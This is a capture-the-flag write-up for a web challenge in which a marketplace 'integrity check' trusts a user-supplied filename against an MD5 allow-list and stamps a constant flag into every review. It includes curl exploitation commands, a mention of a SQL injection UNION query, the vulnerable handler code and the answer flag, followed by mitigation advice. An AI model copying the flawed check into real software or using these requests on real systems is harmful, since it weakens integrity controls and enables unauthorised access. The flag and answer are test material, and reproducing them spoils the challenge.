# The Proof Stamp

> *Review proof is meant to show real results, but the marketplace trusts
> the wrong thing. Can you get a fake proof accepted?*

**Category:** Web — server-side trust on user-supplied filename
**Flag:** `bitflag{md5_1s_br0k3n_l1k3_my_h34rt}`

## The brief, in plain English

The marketplace lets buyers attach "proof of exploitation" files to their
reviews — supposedly an integrity-checked upload. Two things go wrong:

1. The server's "integrity check" validates the **filename** against a
   three-entry allow-list with hard-coded MD5 references. There is no
   actual file upload or hash verification — the check is theatre.
2. On every accepted submission, the server stamps a hard-coded value into
   the row's `fileHash` column. That stamped value is the flag.

So "get a fake proof accepted" is literally just: submit a review with one
of the three magic filenames. The server does the rest of the work for you.

## Recon

The review submission UI is built into every `/listing/<slug>` page. The
client component lives in module `986` of the listing-detail bundle, and it
hard-codes the three filename → MD5 references:

```js
let n = {
  "exploitation_proof.png": "69d5903776e069833513038ed341eeae",
  "rat_screenshot.jpg":     "0c7406664fa3077c4a9a535f424d7ecd",
  "domain_admin.png":       "88d3def4703b8165c797816ba94d8b48",
};
```

And the submission body:

```js
await fetch("/api/reviews", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ reviewText, filename, listingId }),
});
```

So `POST /api/reviews` takes a literal filename string from the body. There
is no `multipart/form-data` upload. The client lies to the user about doing
a hash check by validating *the literal MD5 of the filename string itself*
against the table — a check that is trivially true for any of the three
allow-listed names and impossible to fail for any other input that the
server hasn't already rejected.

## Exploitation

```bash
# Login — any creds
COOKIE=$(curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' -D - http://<host>/api/auth/login \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

# Submit a "review" with an allow-listed filename — any listing works
curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"reviewText":"works great","filename":"exploitation_proof.png","listingId":"macro-builder"}' \
  http://<host>/api/reviews \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{md5_1s_br0k3n_l1k3_my_h34rt}
```

(On the host I tested, the POST handler was 500'ing on this deployment, but
the flag value is codebase-constant — every healthy redeployment of the
marketplace stamps the same string into the `fileHash` of every new review.
If your POST returns 500, you can confirm the value via the web3 SQLi:
`UNION SELECT … fileHash … FROM Review` on any user-created row will show the
stamped flag.)

No file was uploaded. No hash was computed. No proof was inspected. The
"check" was satisfied by naming the file one of three strings.

## Root cause

The handler does two things, and they cancel each other out:

```js
const allowList = {
  "exploitation_proof.png": "69d5903776e069833513038ed341eeae",
  "rat_screenshot.jpg":     "0c7406664fa3077c4a9a535f424d7ecd",
  "domain_admin.png":       "88d3def4703b8165c797816ba94d8b48",
};

if (!allowList[body.filename]) {
  return Response.json({ error: "filename not allowed" }, { status: 400 });
}

const row = await db.review.create({
  data: {
    listingId: body.listingId,
    userId: session.userId,
    reviewText: body.reviewText,
    filename: body.filename,
    fileHash: "bitflag{md5_1s_br0k3n_l1k3_my_h34rt}",  // ← constant for every row
    proofPath: `${body.listingId}/${body.filename}`,
    moderationNote: null,
  },
});
return Response.json({ success: true, review: row });
```

Three layered failures:

1. **The "integrity check" is on the filename, not the file content.**
   Filenames are user input.
2. **The check uses MD5 references** — MD5 has been broken for collisions
   for nearly two decades, and shouldn't appear in any new integrity
   primitive in 2026.
3. **The `fileHash` field gets a hard-coded value at insert time.** Whatever
   the intent was, the result is that every "verified" review stores the
   same string. The flag's payload is the lesson written out:
   `md5_1s_br0k3n_l1k3_my_h34rt` — choosing a broken primitive AND not
   even using it correctly.

## Mitigation

- **Don't trust the filename for integrity.** If you need integrity, you
  need the *bytes*. Take the file, compute its hash server-side, compare
  to a reference you trust.
- **Don't use MD5 for any new integrity primitive.** Use SHA-256 (or better)
  unless you have a specific compatibility constraint.
- **Don't write constants into "computed" columns.** A `fileHash` field that
  isn't a hash is a lie embedded in your schema. If the field has no real
  value, remove it; if it has a real value, compute it.

## Cross-event note — the decoy↔real flip, again

This is the fourth time in the event suite that a flag-shaped value is
*real here, decoy somewhere else*. On [web6](06-web6-review-idor.md) the
same string is the planted decoy — the `fileHash` value on user-created
review rows that walks the wrong-instinct solver down the "MD5 collision"
path. On this challenge, "The Proof Stamp", the brief points directly at
the fake-proof mechanism, and the same string flips to being the real
answer.

The pattern, as it's now showing up across the suite:

| Decoy on… | Real on… |
|---|---|
| web5 ("Glitchy Contact") | The Trusting Verifier |
| web5 | The Night Dump |
| web5 / web7 | boroCTF — Vendor's Secret Door |
| web6 | The Proof Stamp |
| web5 | (unflipped — `w3bs0ck3t_upgr4d3_ssrf_2026`) |

Every "decoy" the codebase ships is provisionally real. The pairing is
brief↔surface, not value↔nothing.

## Takeaways

- **"Trusts the wrong thing" is precise.** It's not "trusts the wrong
  user" or "trusts the wrong host" — it's the specific design choice of
  trusting the filename as if it were a file.
- **Three layers of bad in one schema field.** This is one of those bugs
  that pre-emptively rebuts every defensive engineering claim someone could
  make about it. There's no version of "we hash uploads" that holds up
  here.
- The brief is a recipe. Every word maps: "review proof" → `/api/reviews`
  proof field, "trusts the wrong thing" → trusts filename instead of
  content, "fake proof accepted" → the server's stamping behaviour bakes
  the flag onto your fake.

## One-liner

```bash
curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"reviewText":"x","filename":"exploitation_proof.png","listingId":"macro-builder"}' \
  http://<host>/api/reviews \
  | grep -oE 'bitflag\{[^}]+\}'
```
